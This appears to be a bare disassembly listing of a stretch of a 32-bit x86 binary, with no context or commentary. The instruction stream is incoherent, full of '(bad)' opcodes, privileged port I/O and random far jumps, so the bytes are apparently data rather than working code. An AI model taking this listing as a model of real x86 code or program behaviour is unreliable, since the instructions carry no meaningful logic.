  4117fe:	es cld 
  411800:	pop    ss
  411801:	mov    ecx,0xe4a3c58d
  411806:	rcl    dh,0x2c
  411809:	call   0xacd2:0xdd4b9784
  411810:	ret    
  411811:	sbb    bh,BYTE PTR [edx]
  411813:	xor    eax,0x727af215
  411818:	inc    ecx
  411819:	mov    DWORD PTR [edx-0xd],edx
  41181c:	sub    DWORD PTR [ebp-0x4ab54d80],ebp
  411822:	adc    dh,dh
  411824:	add    al,0x46
  411826:	daa    
  411827:	call   0xa19f6f06
  41182c:	out    dx,al
  41182d:	mov    BYTE PTR [eax-0x6eef98ac],bh
  411833:	lock mov WORD PTR [eax+0x5fc4d99d],gs
  41183a:	mov    esi,0x9bb6e5e1
  41183f:	and    dl,BYTE PTR [edx+0x11728e9]
  411845:	xchg   esp,eax
  411846:	sub    edi,DWORD PTR [ebx]
  411848:	ja     0x41189b
  41184a:	jno    0x411855
  41184c:	shl    dl,cl
  41184e:	xchg   ebx,eax
  41184f:	add    al,0xe9
  411851:	pop    ebp
  411852:	pop    ecx
  411853:	xchg   ebp,eax
  411854:	mov    edi,0xdeeeb76c
  411859:	xchg   ecx,eax
  41185a:	sahf   
  41185b:	cs rcr edi,cl
  41185e:	sbb    BYTE PTR [ecx+edx*8-0x73e75e7f],dh
  411865:	pop    ebx
  411866:	stos   DWORD PTR es:[edi],eax
  411867:	mov    esi,DWORD PTR [ebx]
  411869:	test   BYTE PTR [eax],bl
  41186b:	mov    ch,BYTE PTR [ebx-0x5]
  41186e:	mov    bh,0x9f
  411870:	xor    ch,bh
  411872:	jge    0x411888
  411874:	pop    ds
  411875:	call   0x723f:0x1ff5a43
  41187c:	(bad)  
  41187e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41187f:	(bad)  
  411880:	mov    eax,0xb0fba1d
  411885:	je     0x411888
  411887:	sti    
  411888:	(bad)  
  411889:	test   DWORD PTR [esi-0x58ae0083],0x28771845
  411893:	in     eax,0xba
  411895:	icebp  
  411896:	mov    edx,0xe8f51bde
  41189b:	pop    ebp
  41189c:	mov    WORD PTR [edx+0x47],fs
  41189f:	mov    ds:0xce5d9df7,eax
  4118a4:	sub    al,0x37
  4118a7:	lea    ecx,[edi]
  4118a9:	mov    ebp,0xa832f2af
  4118ae:	mov    edx,ebx
  4118b0:	mov    al,0x54
  4118b2:	mov    al,0xfb
  4118b4:	out    0xfa,al
  4118b6:	jl     0x411904
  4118b8:	mov    eax,ds:0xe0075dcd
  4118bd:	sbb    al,BYTE PTR ds:0x854fc2f1
  4118c3:	mov    bl,0xd4
  4118c5:	jmp    0xf17d03c6
  4118ca:	sti    
  4118cb:	jge    0x4118f6
  4118cd:	(bad)  
  4118ce:	pop    edi
  4118cf:	jbe    0x411946
  4118d1:	test   eax,0x49f29ed6
  4118d6:	scas   eax,DWORD PTR es:[edi]
  4118d7:	mov    DWORD PTR [edx],esi
  4118d9:	sbb    eax,0x22a3a6c1
  4118de:	es push es
  4118e0:	sti    
  4118e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118e2:	ins    BYTE PTR es:[edi],dx
  4118e3:	lahf   
  4118e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118e5:	(bad)  
  4118e6:	cmp    dh,ah
  4118e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e9:	data16 add al,0x22
  4118ec:	sub    edi,DWORD PTR [eax]
  4118ee:	sar    BYTE PTR [ebp+0x420928f6],0x59
  4118f5:	xchg   ecx,eax
  4118f6:	mov    bh,0xcc
  4118f8:	inc    edx
  4118f9:	outs   dx,BYTE PTR ds:[esi]
  4118fa:	pop    ebp
  4118fb:	mov    fs,WORD PTR ds:[ecx-0x10]
  4118ff:	and    DWORD PTR [ebx+0x26],esp
  411902:	push   es
  411903:	test   al,0x7f
  411905:	fnstcw WORD PTR [ecx]
  411907:	ret    
  411908:	mov    dh,0x4c
  41190a:	sbb    ebp,0x7079702e
  411910:	rol    BYTE PTR [edx],0x6b
  411913:	sub    edx,esi
  411915:	mov    ebp,0xb8c14760
  41191a:	add    BYTE PTR [esi+edi*1+0x2f],0xf6
  41191f:	and    bh,dh
  411921:	pop    bp
  411923:	cli    
  411924:	addr16 push edx
  411926:	jo     0x411985
  411928:	jle    0x4118ee
  41192a:	stc    
  41192b:	out    dx,eax
  41192c:	pusha  
  41192d:	adc    BYTE PTR [ebx+0x36],dh
  411930:	sub    eax,0xb20c3f56
  411935:	jae    0x4119b1
  411937:	xchg   ebp,eax
  411938:	fdivr  QWORD PTR [edi-0x5f]
  41193b:	sub    eax,0xdeebf151
  411940:	inc    ebx
  411941:	fidivr WORD PTR [edx+ecx*1]
  411944:	cmp    esi,eax
  411946:	mov    eax,0x6a8d7827
  41194b:	(bad)  
  41194c:	in     eax,dx
  41194d:	std    
  41194e:	mov    esi,0x66cc107e
  411953:	push   ebp
  411954:	jb     0x41197f
  411956:	xchg   esp,eax
  411957:	xchg   DWORD PTR [edi],ebx
  411959:	add    ebx,DWORD PTR [ebx]
  41195b:	add    esp,0xffffffbd
  41195e:	dec    ebp
  41195f:	aad    0x46
  411961:	adc    BYTE PTR [eax],bh
  411963:	dec    edx
  411964:	in     eax,dx
  411965:	in     al,dx
  411966:	aad    0x7a
  411968:	mov    ds:0xceae80ab,eax
  41196d:	and    eax,0xc14db39e
  411972:	ins    DWORD PTR es:[edi],dx
  411973:	cs cld 
  411975:	popa   
  411976:	stc    
  411977:	xchg   ebx,eax
  411978:	ret    0x4f1d
  41197b:	mov    dl,0x1a
  41197d:	fisttp QWORD PTR [esp+esi*8]
  411980:	cwde   
  411981:	pop    edx
  411982:	adc    ah,BYTE PTR [ecx+ebx*8]
  411985:	adc    ebx,0xc9f031ce
  41198b:	sbb    dl,al
  41198d:	and    BYTE PTR [esi],al
  41198f:	and    dl,BYTE PTR [eax-0x8]
  411992:	mov    ebp,0xade5d623
  411997:	div    DWORD PTR [esp+esi*2+0x516b46a9]
  41199e:	leave  
  41199f:	mov    eax,ds:0xdb9e14fa
  4119a4:	mov    edx,0x169ee715
  4119a9:	mov    ds:0x59938cb4,eax
  4119ae:	pop    ds
  4119af:	sbb    BYTE PTR [edx+0xdf05855],al
  4119b5:	adc    al,dl
  4119b7:	sub    ch,BYTE PTR [esi+0x4ad74c54]
  4119bd:	xor    BYTE PTR [ecx+0x2f],ah
  4119c0:	scas   al,BYTE PTR es:[edi]
  4119c1:	int3   
  4119c2:	mov    al,0xa6
  4119c4:	jge    0x411a32
  4119c6:	jne    0x4119d9
  4119c8:	(bad)  
  4119c9:	dec    BYTE PTR [ecx+0x24]
  4119cc:	bound  eax,QWORD PTR [ebp+0x41]
  4119cf:	idiv   BYTE PTR [ebp-0x1b2e921c]
  4119d5:	lahf   
  4119d6:	scas   al,BYTE PTR es:[edi]
  4119d7:	les    dx,DWORD PTR [edx]
  4119da:	cmp    BYTE PTR [edi],bh
  4119dc:	popa   
  4119dd:	aam    0x93
  4119df:	dec    esi
  4119e0:	cmp    al,ch
  4119e2:	xor    DWORD PTR [bx+si-0x7aef],0x230070f2
  4119eb:	adc    al,0xc6
  4119ed:	leave  
  4119ee:	fcom   st(7)
  4119f0:	call   0x7860ab27
  4119f5:	mov    eax,0x71e222c5
  4119fa:	pop    ebx
  4119fb:	inc    ebx
  4119fc:	in     al,dx
  4119fd:	rcr    DWORD PTR ds:0x6a9b27ad,cl
  411a03:	add    edi,DWORD PTR [ecx+0x1c]
  411a06:	push   ds
  411a07:	mov    bh,dh
  411a09:	div    BYTE PTR [edi]
  411a0b:	popf   
  411a0c:	xchg   ebx,eax
  411a0d:	shl    al,cl
  411a0f:	push   0xa5ebaaf7
  411a14:	bound  edi,QWORD PTR [ebx+0x58337068]
  411a1a:	test   edi,esp
  411a1c:	mov    esp,0x8ae0a755
  411a21:	ins    BYTE PTR es:[edi],dx
  411a22:	jne    0x411aa3
  411a24:	out    0xbd,eax
  411a26:	icebp  
  411a27:	jno    0x411a58
  411a29:	cmp    eax,0xf5258e8
  411a2e:	outs   dx,DWORD PTR ds:[esi]
  411a2f:	daa    
  411a30:	shl    BYTE PTR [esi],1
  411a32:	out    0x60,al
  411a34:	mov    ecx,0xc6a106f2
  411a39:	lods   al,BYTE PTR ds:[esi]
  411a3a:	pop    edx
  411a3b:	mov    ebx,ecx
  411a3d:	sub    cl,dh
  411a3f:	ins    DWORD PTR es:[edi],dx
  411a40:	mov    eax,ds:0x16500c14
  411a45:	nop
  411a46:	les    ebx,FWORD PTR [eax+0x2c47842b]
  411a4c:	fdiv   DWORD PTR [eax+0x3f]
  411a4f:	fwait
  411a50:	test   al,0xcc
  411a52:	sbb    ebx,ecx
  411a54:	(bad)  
  411a55:	js     0x411a7c
  411a57:	pop    edx
  411a58:	jno    0x411aba
  411a5a:	add    al,0x7c
  411a5c:	push   ebp
  411a5d:	ins    BYTE PTR es:[edi],dx
  411a5e:	pop    ss
  411a5f:	jbe    0x411a09
  411a61:	push   esi
  411a62:	add    al,0xcf
  411a64:	mov    cl,0xfc
  411a66:	mov    al,0xdd
  411a68:	and    BYTE PTR [eax],cl
  411a6a:	fmul   QWORD PTR [ecx]
  411a6c:	push   ebx
  411a6d:	daa    
  411a6e:	ret    0x1365
  411a71:	es pop edi
  411a73:	sub    eax,0x4ecd9ebf
  411a78:	mov    bl,0xc0
  411a7a:	jne    0x411ab0
  411a7c:	mov    WORD PTR [edx+ecx*1-0x77],ds
  411a80:	xchg   ebp,eax
  411a81:	and    bl,cl
  411a83:	mov    ebx,0x9f8d7a56
  411a88:	and    DWORD PTR [ebp+0x15c8b19c],ebx
  411a8e:	mov    edi,0xb84684b3
  411a93:	xchg   edi,eax
  411a94:	mov    ebx,0xa40f8b4a
  411a99:	shr    edi,1
  411a9b:	(bad)
  411a9f:	sbb    DWORD PTR [edx-0x54a1b257],ecx
  411aa5:	push   eax
  411aa6:	ds push ebp
  411aa8:	bnd jmp 0x411b26
  411aab:	xchg   esi,eax
  411aac:	rol    BYTE PTR [edx+ebp*4],0xe5
  411ab0:	data16 arpl WORD PTR ds:0xa3a54ea,bx
  411ab7:	xchg   esp,esi
  411ab9:	sub    eax,0xcae8d5e6
  411abe:	jns    0x411afa
  411ac0:	sbb    DWORD PTR [eax-0x2788c0c5],edi
  411ac6:	mov    esi,0x768b2279
  411acb:	shr    DWORD PTR [esi-0x3cca0110],cl
  411ad1:	jno    0x411af6
  411ad3:	sub    ecx,DWORD PTR [edi+0x24b8d367]
  411ad9:	jne    0x411a6e
  411adb:	dec    ecx
  411adc:	cmp    DWORD PTR [eax+0x3cff9c5c],ecx
  411ae2:	popf   
  411ae3:	dec    ebx
  411ae4:	je     0x411ab5
  411ae6:	push   ebx
  411ae7:	retf   
  411ae8:	inc    ebp
  411ae9:	cdq    
  411aea:	mov    ah,0x61
  411aec:	xchg   ebp,eax
  411aed:	jb     0x411ab9
  411aef:	adc    eax,DWORD PTR [edx-0x7cd3db21]
  411af5:	xor    BYTE PTR [edx],cl
  411af7:	push   cs
  411af8:	inc    ebx
  411af9:	loopne 0x411b0f
  411afb:	je     0x411a8b
  411afd:	ret    0x9f8e
  411b00:	fwait
  411b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b02:	cli    
  411b03:	fimul  WORD PTR [edx+0x85744a5]
  411b09:	fdivr  DWORD PTR [edx+ebx*4]
  411b0c:	inc    ecx
  411b0d:	xlat   BYTE PTR ds:[ebx]
  411b0e:	mov    bh,0xcc
  411b10:	mov    edx,0x9057a3a6
  411b15:	std    
  411b16:	pop    ecx
  411b17:	ins    DWORD PTR es:[edi],dx
  411b18:	call   0xcad7:0xd622d207
  411b1f:	push   ss
  411b20:	adc    DWORD PTR [edx],eax
  411b22:	test   al,0x9c
  411b24:	fwait
  411b25:	sub    BYTE PTR ds:0x9d8ca336,ch
  411b2b:	not    BYTE PTR [esp+edi*4+0x24]
  411b2f:	xor    ch,bh
  411b31:	iret   
  411b32:	mov    BYTE PTR [edx+0x355a85f0],dl
  411b38:	xor    DWORD PTR [ebx+edx*2-0xd58b68],ebp
  411b3f:	xlat   BYTE PTR ds:[ebx]
  411b40:	push   0x98387703
  411b45:	icebp  
  411b46:	dec    edi
  411b47:	data16 xor al,0xdf
  411b4a:	or     DWORD PTR [esi-0x69],ebx
  411b4d:	sub    al,0xe3
  411b4f:	push   esp
  411b50:	or     ebx,DWORD PTR ds:0x6dfa719
  411b56:	adc    BYTE PTR fs:[eax-0x23],0xc4
  411b5b:	pop    esi
  411b5c:	pop    eax
  411b5d:	mov    ebp,DWORD PTR [edx-0x42db8be7]
  411b63:	mov    dh,BYTE PTR [ebx+0x3]
  411b66:	adc    al,BYTE PTR [edi]
  411b68:	and    eax,0xc62f00d6
  411b6d:	xor    al,0xd6
  411b6f:	int    0x2f
  411b71:	in     al,0xd1
  411b73:	push   0x76
  411b75:	or     al,cl
  411b77:	xchg   ebx,eax
  411b78:	mov    cl,0xb
  411b7a:	les    ebp,FWORD PTR [ecx+0x5e]
  411b7d:	arpl   WORD PTR [eax+0x24],bx
  411b80:	jnp    0x411b1c
  411b82:	inc    ecx
  411b83:	and    esp,edx
  411b85:	ret    
  411b86:	sbb    dl,BYTE PTR [ebx-0x70]
  411b89:	repnz out dx,eax
  411b8b:	pushf  
  411b8c:	fild   WORD PTR [edi-0x220aed99]
  411b92:	pop    edi
  411b93:	rol    DWORD PTR [edi-0x55],cl
  411b96:	imul   ebp,DWORD PTR [ecx+0x5c],0x44
  411b9a:	add    al,ah
  411b9c:	push   esp
  411b9d:	pop    ebp
  411b9e:	(bad)  
  411b9f:	fld    DWORD PTR [ebx+eiz*8]
  411ba2:	scas   al,BYTE PTR es:[edi]
  411ba3:	and    eax,0x8791ccac
  411ba8:	adc    cl,BYTE PTR [ebx-0x67c7634a]
  411bae:	bound  esi,QWORD PTR [esi+0x6b]
  411bb1:	jl     0x411bf7
  411bb3:	ins    DWORD PTR es:[edi],dx
  411bb4:	push   ebx
  411bb5:	shr    DWORD PTR [esi],1
  411bb7:	push   0x7829d384
  411bbc:	push   cs
  411bbd:	out    0x0,eax
  411bbf:	add    al,0x73
  411bc1:	nop
  411bc2:	jle    0x411c0e
  411bc4:	or     BYTE PTR ds:0xcf54576b,0xa5
  411bcb:	push   esp
  411bcc:	test   eax,0x175c2f31
  411bd1:	sub    al,0x86
  411bd3:	retf   
  411bd4:	mov    ch,0xc5
  411bd6:	ins    BYTE PTR es:[edi],dx
  411bd7:	mov    ah,0x29
  411bd9:	sub    eax,0x260b2de1
  411bde:	dec    edx
  411bdf:	fcomp  QWORD PTR [edi+0x22]
  411be2:	jecxz  0x411ba1
  411be4:	fwait
  411be5:	mov    edi,0x4cb37ac3
  411bea:	cmp    DWORD PTR [ebp+0x38],0x882d41e3
  411bf1:	pop    eax
  411bf2:	sbb    eax,DWORD PTR [edx-0x4c]
  411bf5:	dec    esi
  411bf6:	dec    esi
  411bf7:	fcmovne st,st(1)
  411bf9:	out    0x18,eax
  411bfb:	stos   BYTE PTR es:[edi],al
  411bfc:	fidivr WORD PTR [esi+0x630b7018]
  411c02:	ret    
  411c03:	sbb    DWORD PTR [ebp-0x15f27561],ecx
  411c09:	cmp    al,0xcf
  411c0b:	sub    dh,BYTE PTR [ebp+0x6b]
  411c0e:	dec    esi
  411c0f:	mov    bh,0x25
  411c11:	iret   
  411c12:	mov    ch,0xff
  411c14:	ja     0x411bb2
  411c16:	loopne 0x411c8e
  411c18:	xor    eax,0x796647f7
  411c1d:	sar    DWORD PTR [esi+0x742f4c31],cl
  411c23:	add    al,BYTE PTR [esi-0x63]
  411c26:	call   0x8454:0x21a20b4d
  411c2d:	enter  0x1e6b,0x9e
  411c31:	clc    
  411c32:	jb     0x411c0b
  411c34:	test   esp,esp
  411c36:	dec    edi
  411c37:	xchg   DWORD PTR [edi],ebx
  411c39:	jmp    0x5ea2:0x993e67d9
  411c40:	out    0x17,al
  411c42:	clc    
  411c43:	cmp    DWORD PTR [edi],eax
  411c45:	inc    esi
  411c46:	fistp  QWORD PTR [ecx]
  411c48:	push   ebx
  411c49:	popf   
  411c4a:	sub    BYTE PTR [eax+0x4b],bl
  411c4d:	pop    ecx
  411c4e:	leave  
  411c4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c50:	xlat   BYTE PTR ds:[ebx]
  411c51:	ret    0xd68d
  411c54:	lock jno 0x411c3b
  411c57:	cld    
  411c58:	stc    
  411c59:	adc    DWORD PTR [ecx+0x362fbc64],ecx
  411c5f:	hlt    
  411c60:	mov    edi,0xbc1c7a45
  411c65:	fcmovnu st,st(2)
  411c67:	or     al,0x1f
  411c69:	jnp    0x411cc2
  411c6b:	in     eax,dx
  411c6c:	push   es
  411c6d:	aas    
  411c6e:	xchg   ebp,eax
  411c6f:	loope  0x411bf3
  411c71:	xchg   esi,eax
  411c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c73:	retf   
  411c74:	adc    edi,ebp
  411c76:	(bad)  
  411c77:	mov    esp,0xb6dc61e9
  411c7c:	add    bh,bl
  411c7e:	inc    ebx
  411c7f:	in     eax,0x84
  411c81:	loopne 0x411c48
  411c83:	or     eax,0xa683b0d9
  411c88:	push   ecx
  411c89:	sti    
  411c8a:	push   ebp
  411c8b:	popa   
  411c8c:	xchg   edi,eax
  411c8d:	mov    esi,DWORD PTR [ebx+0x6f3704f9]
  411c93:	clc    
  411c94:	es xchg ebx,eax
  411c96:	xchg   esi,eax
  411c97:	rol    BYTE PTR [ecx],cl
  411c99:	mov    ebx,0xbe30649d
  411c9e:	les    ebx,FWORD PTR [edi]
  411ca0:	ror    DWORD PTR [eax],cl
  411ca2:	mov    esi,0xb89878e3
  411ca7:	push   ds
  411ca8:	(bad)  
  411ca9:	retf   0x2429
  411cac:	in     al,0x92
  411cae:	int3   
  411caf:	xor    edx,DWORD PTR [edx+0x44]
  411cb2:	popa   
  411cb3:	enter  0xb1a,0xf0
  411cb7:	sbb    al,0x46
  411cb9:	nop
  411cba:	pop    es
  411cbb:	mov    dh,0x1f
  411cbd:	ficomp DWORD PTR [edi]
  411cbf:	loopne 0x411cbe
  411cc1:	(bad)  
  411cc2:	std    
  411cc3:	mov    dh,0xdc
  411cc5:	push   edx
  411cc6:	retf   
  411cc7:	push   esp
  411cc8:	xchg   edx,edx
  411cca:	mov    DWORD PTR [edi],edx
  411ccc:	bnd ret 
  411cce:	call   0x4be217fc
  411cd3:	xchg   edx,eax
  411cd4:	xor    esi,DWORD PTR [ebx+edi*1]
  411cd7:	cmp    BYTE PTR [edi],bh
  411cd9:	inc    edx
  411cda:	and    edx,DWORD PTR [ecx]
  411cdc:	pusha  
  411cdd:	aad    0xe7
  411cdf:	adc    al,0xfc
  411ce1:	jae    0x411cb8
  411ce3:	push   DWORD PTR [ecx+0x9bd7c4d]
  411ce9:	aaa    
  411cea:	cwde   
  411ceb:	lock hlt 
  411ced:	push   cs
  411cee:	rcl    bl,1
  411cf0:	pop    DWORD PTR [ecx+0x74]
  411cf3:	sbb    al,0x2d
  411cf5:	in     eax,0xa5
  411cf7:	sbb    eax,ecx
  411cf9:	inc    eax
  411cfa:	mov    ecx,0x68125c1d
  411cff:	push   edx
  411d00:	cmp    DWORD PTR [eax],0x2e
  411d03:	ss pop edx
  411d05:	mov    ds:0xd9ec122c,eax
  411d0a:	nop
  411d0b:	in     eax,0xcc
  411d0d:	sti    
  411d0e:	adc    edi,edi
  411d10:	(bad)  
  411d11:	iret   
  411d12:	xchg   edx,eax
  411d13:	pop    esi
  411d14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d15:	jmp    0x16ed7a2e
  411d1a:	sub    al,0xd1
  411d1c:	and    BYTE PTR [eax-0x7a],dl
  411d1f:	xor    ch,BYTE PTR es:0x11c84975
  411d26:	outs   dx,BYTE PTR ds:[esi]
  411d27:	add    eax,ebp
  411d29:	adc    BYTE PTR ds:[edx-0x23],ch
  411d2d:	xor    eax,DWORD PTR [ebx+0x55]
  411d30:	or     al,0xd3
  411d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d33:	das    
  411d34:	les    esi,FWORD PTR [ebx]
  411d36:	aaa    
  411d37:	hlt    
  411d38:	lods   eax,DWORD PTR ds:[esi]
  411d39:	add    al,BYTE PTR [ebx-0x6e27588]
  411d3f:	mov    BYTE PTR [ebx],bh
  411d41:	es jge 0x411db9
  411d44:	das    
  411d45:	popa   
  411d46:	cmp    eax,0xdcc996e9
  411d4b:	out    0x77,al
  411d4d:	inc    edi
  411d4e:	pop    es
  411d4f:	push   edx
  411d50:	fisubr DWORD PTR [esi]
  411d52:	inc    ebx
  411d53:	test   eax,0x865bcd1
  411d58:	jmp    0x74e0:0x6667b4a0
  411d5f:	and    bl,ah
  411d61:	or     eax,0x2a101418
  411d66:	mov    al,0x25
  411d68:	sbb    edi,ebp
  411d6a:	mov    ah,ah
  411d6c:	(bad)  
  411d6d:	idiv   DWORD PTR [edi-0x5136ad0f]
  411d73:	jne    0x411d52
  411d75:	retf   0x7d98
  411d78:	pop    esp
  411d79:	mov    esp,0x7841136a
  411d7e:	jb     0x411db9
  411d80:	lahf   
  411d81:	lahf   
  411d82:	std    
  411d83:	scas   al,BYTE PTR es:[edi]
  411d84:	inc    eax
  411d85:	ret    0x754e
  411d88:	arpl   WORD PTR [esi-0x7e3eba68],bp
  411d8e:	add    esi,DWORD PTR [ebx]
  411d90:	cmp    eax,0xf0590263
  411d95:	cmp    eax,0x3bc12663
  411d9a:	add    al,0x86
  411d9d:	ja     0x411d44
  411d9f:	pop    ss
  411da0:	sti    
  411da1:	icebp  
  411da2:	jbe    0x411d8d
  411da4:	dec    ebx
  411da5:	mov    esp,0x59732498
  411daa:	xchg   DWORD PTR [ecx-0x46],esp
  411dad:	ret    0xeff6
  411db0:	pop    edx
  411db1:	enter  0xf9e1,0x1f
  411db5:	test   eax,0x6c291b6
  411dba:	sub    eax,DWORD PTR [edx-0x65c98ff0]
  411dc0:	adc    bh,BYTE PTR [ebp+esi*2+0x5f48a62c]
  411dc7:	or     ah,BYTE PTR [edx+0xd4ed171]
  411dcd:	jae    0x411e17
  411dcf:	shl    DWORD PTR [ebp+eax*4+0x2cd1527a],1
  411dd6:	cdq    
  411dd7:	ja     0x411df1
  411dd9:	adc    eax,0xf96fc125
  411dde:	add    ebx,0x38031f04
  411de4:	jns    0x411d70
  411de6:	mov    eax,ds:0xe574e976
  411deb:	sub    al,0x29
  411ded:	(bad)  
  411dee:	adc    ecx,DWORD PTR ss:0x62ab1952
  411df5:	ret    
  411df6:	arpl   sp,sp
  411df8:	xchg   esp,eax
  411df9:	js     0x411e1c
  411dfb:	(bad)
  411e00:	jnp    0x411dd6
  411e02:	and    al,0x7e
  411e04:	sub    al,0x41
  411e06:	addr16 mov al,ds:0xedea
  411e0a:	repnz add eax,0x5906c516
  411e10:	jmp    0x411e15
  411e12:	imul   esi,DWORD PTR [esi],0xffffffb4
  411e15:	inc    ebx
  411e16:	icebp  
  411e17:	or     ah,0xa2
  411e1a:	pop    ds
  411e1b:	sub    bh,BYTE PTR [edx-0x4a]
  411e1e:	ss xor ah,0xa6
  411e22:	ret    0xfb15
  411e25:	push   cs
  411e26:	adc    ebx,edi
  411e28:	push   ecx
  411e29:	push   cs
  411e2a:	fst    QWORD PTR [edi+0xf]
  411e2d:	test   eax,0xe290aff2
  411e32:	xor    al,0x89
  411e34:	and    DWORD PTR [ebp-0x49375d6],ebp
  411e3a:	jbe    0x411ea6
  411e3c:	(bad)  
  411e3d:	daa    
  411e3e:	out    dx,al
  411e3f:	add    eax,edi
  411e41:	push   ebx
  411e42:	fs xchg ebx,eax
  411e44:	rcl    DWORD PTR [esi-0xd],cl
  411e47:	pop    edi
  411e48:	daa    
  411e49:	or     al,0x4a
  411e4b:	stos   DWORD PTR es:[edi],eax
  411e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e4d:	rcr    dl,1
  411e4f:	mov    ebx,0x85c070fb
  411e54:	pop    edi
  411e55:	rol    BYTE PTR [edi+0x66],cl
  411e58:	sbb    DWORD PTR [edx],edi
  411e5a:	cmp    ebp,eax
  411e5c:	les    eax,FWORD PTR [ebp+0xf]
  411e5f:	mov    ds:0xe27b0161,al
  411e64:	enter  0x979c,0x22
  411e68:	pop    esp
  411e69:	retf   0xd48d
  411e6c:	fistp  WORD PTR [edx]
  411e6e:	dec    ecx
  411e6f:	cwde   
  411e70:	popa   
  411e71:	sub    DWORD PTR [ebp-0x37],ebp
  411e74:	dec    ebx
  411e75:	outs   dx,DWORD PTR ds:[si]
  411e77:	adc    edi,eax
  411e79:	cmp    DWORD PTR [ebx+0x6cebbd2d],0x7f7ce687
  411e83:	and    al,0x29
  411e85:	sub    eax,0x3805e28e
  411e8a:	pop    ebp
  411e8b:	xchg   DWORD PTR [ebx],edx
  411e8d:	sar    DWORD PTR [edi-0x2eedb92],1
  411e93:	add    ecx,esi
  411e95:	dec    edi
  411e96:	mov    esi,0x4ffac536
  411e9b:	dec    ecx
  411e9c:	xchg   ecx,eax
  411e9d:	xlat   BYTE PTR ds:[ebx]
  411e9e:	into   
  411e9f:	jg     0x411eef
  411ea1:	outs   dx,DWORD PTR ds:[esi]
  411ea2:	loope  0x411e31
  411ea4:	test   al,0xd0
  411ea6:	cld    
  411ea7:	pop    ebx
  411ea8:	repnz scas al,BYTE PTR es:[edi]
  411eaa:	dec    edi
  411eab:	neg    DWORD PTR ds:0xf0528143
  411eb1:	dec    esp
  411eb2:	mov    ah,0xa4
  411eb4:	ret    
  411eb5:	inc    edi
  411eb6:	into   
  411eb7:	aad    0x1b
  411eb9:	sbb    al,0x6b
  411ebb:	add    ebx,DWORD PTR [ebx+0xc]
  411ebe:	jmp    0x33b73ff3
  411ec3:	fadd   QWORD PTR [ecx+0x1d9325e8]
  411ec9:	loop   0x411e8b
  411ecb:	push   edi
  411ecc:	inc    ebp
  411ecd:	ins    BYTE PTR es:[edi],dx
  411ece:	fsubp  st(6),st
  411ed0:	sub    ah,ch
  411ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ed3:	or     edx,esp
  411ed5:	mov    al,0x38
  411ed7:	dec    edi
  411ed8:	fstp   TBYTE PTR [ecx-0xbd95175]
  411ede:	dec    ebp
  411edf:	ds and ah,ah
  411ee2:	pop    esp
  411ee3:	cmp    al,0x44
  411ee5:	jl     0x411f36
  411ee7:	pop    ebx
  411ee8:	inc    esi
  411ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eea:	fist   WORD PTR [eax+0x52]
  411eed:	push   ebx
  411eee:	inc    edx
  411eef:	ret    
  411ef0:	pop    ebp
  411ef1:	add    eax,0xf5de2278
  411ef6:	in     eax,0xc4
  411ef8:	or     DWORD PTR [esi],ebx
  411efa:	and    BYTE PTR [ebx],dl
  411efc:	stos   DWORD PTR es:[edi],eax
  411efd:	xor    al,ah
  411eff:	dec    ecx
  411f00:	lods   eax,DWORD PTR ds:[esi]
  411f01:	add    DWORD PTR [ecx],esp
  411f03:	(bad)  
  411f05:	nop
  411f06:	push   es
  411f07:	push   ebx
  411f08:	es sar edi,1
  411f0b:	inc    eax
  411f0c:	push   edx
  411f0d:	adc    al,0x5f
  411f0f:	pop    eax
  411f10:	dec    esp
  411f11:	dec    ecx
  411f12:	dec    edi
  411f13:	daa    
  411f14:	or     bl,BYTE PTR [edx-0x2b4cf69d]
  411f1a:	fdiv   QWORD PTR [eax-0x56]
  411f1d:	mov    cs,WORD PTR [ecx+0x6b009408]
  411f23:	inc    ecx
  411f24:	dec    esi
  411f25:	je     0x411eb5
  411f27:	nop
  411f28:	int    0xd9
  411f2a:	or     bl,BYTE PTR [edx]
  411f2c:	push   es
  411f2d:	mov    bl,dl
  411f2f:	cmp    DWORD PTR [ecx+0x1f],0xffffff92
  411f33:	jp     0x411f54
  411f35:	neg    BYTE PTR [esi+0x78883f44]
  411f3b:	mov    dl,0xc1
  411f3d:	sbb    dl,BYTE PTR [eax]
  411f3f:	nop
  411f40:	push   eax
  411f41:	sbb    edi,DWORD PTR [edi-0x58]
  411f44:	push   esp
  411f45:	cmp    DWORD PTR [edx-0x464c88d3],0xffffffa6
  411f4c:	mov    esi,DWORD PTR [eax-0x47]
  411f4f:	push   esi
  411f50:	or     BYTE PTR [eax-0x4e],dh
  411f53:	jmp    0x411f78
  411f55:	push   ebx
  411f56:	retf   0xa7ec
  411f59:	jnp    0x411f0a
  411f5b:	or     ebx,esp
  411f5d:	inc    eax
  411f5e:	fcom   DWORD PTR [edi-0x7f]
  411f61:	fwait
  411f62:	imul   ebp,DWORD PTR [ebx+0x75cb6533],0x5de04a9c
  411f6c:	and    DWORD PTR [esi-0x20],edx
  411f6f:	add    al,0x65
  411f71:	push   0xffffffca
  411f73:	jns    0x411fa3
  411f75:	inc    esp
  411f77:	loope  0x411fe8
  411f79:	mov    ch,BYTE PTR [esp+edi*4-0x6]
  411f7d:	add    BYTE PTR [ebx+0x49],al
  411f80:	adc    BYTE PTR [ebp+edx*2-0x1a0c5037],ah
  411f87:	jo     0x411f43
  411f89:	xchg   ecx,eax
  411f8a:	pop    ds
  411f8b:	mov    ch,0x6f
  411f8d:	repz std 
  411f8f:	dec    ebp
  411f90:	or     esi,DWORD PTR ds:0xce9c3b41
  411f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f97:	call   FWORD PTR [ecx-0x4800028a]
  411f9d:	mov    dl,0x7e
  411f9f:	mov    BYTE PTR [edx],dl
  411fa1:	mov    dl,BYTE PTR [ebx-0x78]
  411fa4:	cmc    
  411fa5:	icebp  
  411fa6:	push   esi
